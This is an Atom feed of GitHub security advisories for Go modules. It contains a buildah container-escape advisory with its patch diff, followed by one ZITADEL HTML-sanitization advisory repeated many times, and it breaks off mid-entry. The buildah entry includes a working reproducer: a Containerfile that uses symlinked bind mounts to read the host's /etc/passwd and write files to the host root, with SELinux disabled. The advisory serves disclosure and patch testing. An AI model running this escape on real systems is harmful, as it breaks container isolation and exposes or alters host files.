<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-03-19T22:01:23.843Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/containers/buildah] Container escape at build time]]></title>
        <id>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</id>
        <link href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf"/>
        <updated>2024-03-19T20:06:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Users running containers with root privileges allowing a container to run with read/write access to the host system files when selinux is not enabled.  With selinux enabled, some read access is allowed.</p>
<h3 id="patches">Patches</h3>
<p>From @nalind </p>
<pre><code># cat /root/cve-2024-1753.diff
--- internal/volumes/volumes.go
+++ internal/volumes/volumes.go
@@ -11,6 +11,7 @@ import (
 
     "errors"
 
+	"github.com/containers/buildah/copier"
     "github.com/containers/buildah/define"
     "github.com/containers/buildah/internal"
     internalParse "github.com/containers/buildah/internal/parse"
@@ -189,7 +190,11 @@ func GetBindMount(ctx *types.SystemContext, args []string, contextDir string, st
     // buildkit parity: support absolute path for sources from current build context
     if contextDir != "" {
         // path should be /contextDir/specified path
-		newMount.Source = filepath.Join(contextDir, filepath.Clean(string(filepath.Separator)+newMount.Source))
+		evaluated, err := copier.Eval(contextDir, newMount.Source, copier.EvalOptions{})
+		if err != nil {
+			return newMount, "", err
+		}
+		newMount.Source = evaluated
     } else {
         // looks like its coming from `build run --mount=type=bind` allow using absolute path
         // error out if no source is set
</code></pre>
<h3 id="reproducer">Reproducer</h3>
<p>Prior to testing, as root, add a memorable username to <code>/etc/passwd</code> via adduser or your favorite editor.   Also create a memorably named file in <code>/</code>.  Suggest: <code>touch /SHOULDNTSEETHIS.txt</code> and <code>adduser SHOULDNTSEETHIS</code>.  After testing, remember to remove both the file and the user from your system.</p>
<p>Use the following Containerfile</p>
<pre><code># cat ~/cve_Containerfile
FROM alpine as base

RUN ln -s / /rootdir
RUN ln -s /etc /etc2

FROM alpine

RUN echo "ls container root"
RUN ls -l /

RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit

RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
</code></pre>
<h4 id="to-test">To Test</h4>
<h5 id="testing-with-an-older-version-of-buildah-with-the-issue">Testing with an older version of Buildah with the issue</h5>
<pre><code>setenforce 0
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>As part of the printout from the build, you should be able to see the contents of the <code>/' and </code>/etc<code>directories, including the</code>/SHOULDNOTSEETHIS.txt<code>file that you created, and the contents of the</code>/etc/passwd<code>file which will include the</code>SHOULDNOTSEETHIS<code>user that you created.  In addition, the file</code>/BIND_BREAKOUT<code>and</code>/etc/BIND_BREAKOUT2` will exist on the host after the command is completed.  Be sure to remove those two files between tests.  </p>
<pre><code>buildah rm -a
buildah rmi -a
rm /BIND_BREAKOUT
rm /etc/BIND_BREAKOUT2
setenforce 1
buildah build -f ~/cve_Containerfile .
</code></pre>
<p>Neither the <code>/BIND_BREAKEOUT</code> or <code>/etc/BIND_BREAKOUT2</code> files should be created.  An error should be raised during the build when both files are trying to be created.  Also, errors will be raised when the build tries to display the contents of the <code>/etc/passwd</code> file, and nothing will be displayed from that file.  </p>
<p>However, the files in both the <code>/</code> and <code>/etc</code> directories on the host system will be displayed.</p>
<h5 id="testing-with-the-patch">Testing with the patch</h5>
<p>Use the same commands as testing with an older version of Buildah.</p>
<p>When running using the patched version of Buildah, regardless of the <code>setenforce</code> settings,  you should not see the file that you created or the user that you added.  Also the <code>/BIND_BREAKOUT</code> and the <code>/etc/BIND_BREAKOUT</code> will not exist on the host after the test completes.</p>
<p>NOTE: With the fix, the contents of the <code>/</code> and <code>/etc</code> directories, and the <code>/etc/passwd</code> file will be displayed, however, it will be the file and contents from the container image, and NOT the host system.  Also the <code>/BIND_BREAKOUT</code> and <code>/etc/BIND_BREAKOUT</code> files will be created in the container image.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure selinux controls are in place to avoid compromising sensitive system files and systems.  With "setenforce 0" set, which is not at all advised, the root file system is open for modification with this exploit.  With "setenfoce 1" set, which is the recommendation, files can not be changed.  However, the contents of the <code>/</code> directory can be displayed.  I.e., <code>ls -alF /</code> will show the contents of the host directory.</p>
<h3 id="references">References</h3>
<p>Unknown.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/containers/buildah/security/advisories/GHSA-pmf3-c36m-g5cf</a></li>
<li><a href="https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5">https://github.com/containers/buildah/commit/9de9c20ff368beb84b84fe660773d352519dc1c5</a></li>
<li><a href="https://github.com/advisories/GHSA-pmf3-c36m-g5cf">https://github.com/advisories/GHSA-pmf3-c36m-g5cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmf3-c36m-g5cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-19T20:06:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
<h3 id="questions">Questions</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@zitadel.com">security@zitadel.com</a></p>
<h3 id="credits">Credits</h3>
<p>Thanks to Daniel Philipp - owt and Thomas Wickham - synopsis for reporting this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/zitadel/zitadel/security/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28855">https://nvd.nist.gov/vuln/detail/CVE-2024-28855</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">https://github.com/zitadel/zitadel/releases/tag/v2.41.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">https://github.com/zitadel/zitadel/releases/tag/v2.42.15</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">https://github.com/zitadel/zitadel/releases/tag/v2.43.9</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">https://github.com/zitadel/zitadel/releases/tag/v2.44.3</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">https://github.com/zitadel/zitadel/releases/tag/v2.45.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">https://github.com/zitadel/zitadel/releases/tag/v2.46.1</a></li>
<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">https://github.com/zitadel/zitadel/releases/tag/v2.47.3</a></li>
<li><a href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj">https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-18T20:34:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zitadel/zitadel] Improper HTML sanitization in ZITADEL]]></title>
        <id>https://github.com/advisories/GHSA-hfrg-4jwr-jfpj</id>
        <link href="https://github.com/advisories/GHSA-hfrg-4jwr-jfpj"/>
        <updated>2024-03-19T18:31:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>ZITADEL uses Go templates to render the login UI.</p>
<p>Due to a improper use of the <code>text/template</code> instead of the <code>html/template</code> package, the Login UI did not sanitize input parameters. An attacker could create a malicious link, where he injected code which would be rendered as part of the login screen.
While it was possible to inject HTML including javascript, the execution of such scripts would be prevented by the Content Security Policy.</p>
<h3 id="patches">Patches</h3>
<p>2.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.47.3">2.47.3</a>
2.46.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.46.1">2.46.1</a>
2.45.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.45.1">2.45.1</a>
2.44.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.44.3">2.44.3</a>
2.43.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.43.9">2.43.9</a>
2.42.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.42.15">2.42.15</a>
2.41.x versions are fixed on &gt;= <a href="https://github.com/zitadel/zitadel/releases/tag/v2.41.15">2.41.15</a></p>
<p>ZITADEL recommends upgrading to the latest versions available in due course.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround since a patch is already available.</p>
